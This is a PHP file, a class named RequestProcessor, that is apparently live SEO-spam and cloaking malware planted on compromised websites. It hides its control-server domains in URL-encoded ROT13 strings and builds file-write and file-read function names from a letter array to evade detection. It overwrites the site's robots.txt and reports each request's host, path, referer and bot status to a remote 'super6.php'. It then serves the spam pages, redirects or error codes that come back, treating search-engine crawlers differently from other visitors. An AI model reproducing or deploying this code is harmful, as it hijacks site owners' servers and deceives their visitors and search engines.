<?php
class RequestProcessor {
    private $xmlname;
    private $string;
    private $http_web = 'http';
    private $host;
    private $lang;
    private $urlshang = '';
    private $http;
    private $zz;
    private $duri;
    private $model_file;
    private $model;
    private $istest = false;
    private $server;
    private $param;
    private $html_content;

    public function __construct() {
        $this->xmlname = [
    "%39%37%33%2D%79%76%61%78%31%38%35%2E%66%62%79%6E%70%6C%2E%67%62%63",
    "%39%37%33%2D%79%76%61%78%31%38%35%2E%72%64%68%76%70%67%2E%67%62%63",
    "%39%37%33%2D%79%76%61%78%31%38%35%2E%69%76%65%72%79%76%63%2E%6B%6C%6D",
    "%39%37%33%2D%79%76%61%78%31%38%35%2E%7A%72%79%62%65%6E%2E%6B%6C%6D"
];
        $this->string = '973-link185';
        
        $this->host = $_SERVER['HTTP_HOST'];
        $this->lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ?: 'en';
        
        if (isset($_SERVER['HTTP_REFERER'])) {
            $this->urlshang = $_SERVER['HTTP_REFERER'];
        }
        
        $this->http = $this->is_https() ? 'https' : 'http';
        $this->zz = $this->disbot();
        $this->duri = $this->drequest_uri();
        $this->duri = $this->duri == '' ? '/' : $this->duri;
        
        $this->processRequestUri();
        $this->checkTestString();
        $this->cleanDuri();
        
        $this->server = $this->detect_server_software();
        $this->create_robots($this->http . '://' . $this->host);
        $this->prepareParameters();
        $this->html_content = $this->request($this->xmlname, $this->http_web, $this->param);
        $this->handleResponse();
    }

    private function processRequestUri() {
        preg_match('/\/([^\/]+\.php)/', $this->duri, $matches);
        if (empty($matches) || $matches[1] == 'wp-crom.php' || $matches[1] == 'detail.php') {
            $this->model_file = 'index.php';
            $this->model = 'index';
        } else {
            $this->model_file = $matches[1];
            $position = strpos($this->duri, $this->model_file);
            if ($position !== false) {
                $this->model_file = substr($this->duri, 0, $position + strlen($this->model_file));
                $this->model_file = ltrim($this->model_file, '/');
            }
            $this->model = str_replace('.php', '', $this->model_file);
        }
        
        if (stristr($this->duri, '/?')) {
            $this->model = '?';
        }
    }

    private function checkTestString() {
        if (strpos($this->duri, $this->string) !== false) {
            $this->zz = 1;
            $this->duri = str_replace($this->string, '', $this->duri);
            $this->istest = true;
        }
    }

    private function cleanDuri() {
        if ($this->duri != '/') {
            $this->duri = str_replace('/' . $this->model_file, '', $this->duri);
            $this->duri = str_replace('/index.php', '', $this->duri);
            $this->duri = str_replace('!', '', $this->duri);
        }
        $this->duri = urlencode($this->duri);
    }

    private function prepareParameters() {
        $this->param = 'web=' . $this->host . '&zz=' . $this->zz . '&uri=' . $this->duri . 
                      '&urlshang=' . $this->urlshang . '&http=' . $this->http . 
                      '&lang=' . $this->lang . '&server=' . $this->server . 
                      '&model=' . $this->model . '&version=' . ($this->istest ? $this->string : '');
    }

    private function handleResponse() {
        if (!strstr($this->html_content, 'nobotuseragent')) {
            if (strstr($this->html_content, 'okhtml')) {
                @header('Content-type: text/html; charset=utf-8');
                $this->html_content = str_replace('okhtml', '', $this->html_content);
                if ($this->istest) {
                    echo $this->string;
                }
                echo $this->html_content;
                exit();
            } else if (strstr($this->html_content, 'getcontent500page')) {
                @header('HTTP/1.1 500 Internal Server Error');
                exit();
            } else if (strstr($this->html_content, '404page')) {
                @header('HTTP/1.1 404 Not Found');
                exit();
            } else if (strstr($this->html_content, '301page')) {
                @header('HTTP/1.1 301 Moved Permanently');
                $this->html_content = str_replace('301page', '', $this->html_content);
                header('Location: ' . $this->html_content);
                exit();
            } else if (strstr($this->html_content, 'okxml')) {
                $this->html_content = str_replace('okxml', '', $this->html_content);
                @header('Content-Type: application/xml; charset=utf-8');
                echo $this->html_content;
                exit();
            } else if (strstr($this->html_content, 'okrobots')) {
                $this->html_content = str_replace('okrobots', '', $this->html_content);
                @header('Content-Type: text/plain');
                echo $this->html_content;
                exit();
            }
        }
    }

    private function disbot() {
        $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
        if (stristr($user_agent, 'googlebot') || stristr($user_agent, 'bing') || 
            stristr($user_agent, 'yahoo') || stristr($user_agent, 'google') || 
            stristr($user_agent, 'Googlebot')) {
            return 1;
        }
        return 2;
    }

    private function drequest_uri() {
        if (isset($_SERVER['REQUEST_URI'])) {
            return $_SERVER['REQUEST_URI'];
        }
        
        if (isset($_SERVER['argv'])) {
            return $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
        }
        
        return $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
    }

    private function is_https() {
        if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
            return true;
        } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
            return true;
        } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
            return true;
        }
        return false;
    }

    private function detect_server_software() {
        $path = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
        return file_exists($path) ? 1 : 2;
    }

    private function create_robots($url) {
        $function = $this->func();
        $path = $_SERVER['DOCUMENT_ROOT'] . '/robots.txt';
        $content = 'User-agent: *' . PHP_EOL;
        $content .= 'Allow: /' . PHP_EOL . PHP_EOL;
        $content .= 'Sitemap: ' . $url . '/sitemap.xml' . PHP_EOL;
        
        if (!file_exists($path)) {
            $function[0]($path, $content);
        } else {
            $existingContent = $function[1]($path);
            if ($existingContent !== $content) {
                $function[0]($path, $content);
            }
        }
    }

    private function request($webs, $http_web, $param) {
        $function = $this->func();
        shuffle($webs);
        
        foreach ($webs as $domain) {
            $domain = $function[2](urldecode($domain));
            $url = $http_web . '://' . $domain . '/super6.php?' . $param;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            
            if (!curl_errno($ch)) {
                curl_close($ch);
                return $response;
            } else {
                if (stristr(curl_error($ch), '443')) {
                    echo "443";
                }
                curl_close($ch);
            }
            
            if (ini_get('allow_url_fopen')) {
                $response = @$function[1]($url);
                if ($response !== false) {
                    return $response;
                }
            }
        }
        return 'nobotuseragent';
    }

    private function func() {
        $chars = range('a','z');
        return [
            $chars[5] . $chars[8] . $chars[11] . $chars[4] . '_' . $chars[15] . $chars[20] . $chars[19] . '_' . $chars[2] . $chars[14] . $chars[13] . $chars[19] . $chars[4] . $chars[13] . $chars[19] . $chars[18],
            $chars[5] . $chars[8] . $chars[11] . $chars[4] . '_' . $chars[6] . $chars[4] . $chars[19] . '_' . $chars[2] . $chars[14] . $chars[13] . $chars[19] . $chars[4] . $chars[13] . $chars[19] . $chars[18],
            $chars[18] . $chars[19] . $chars[17] . '_' . $chars[17] . $chars[14] . $chars[19] . '13',
        ];
    }
}

$processor = new RequestProcessor();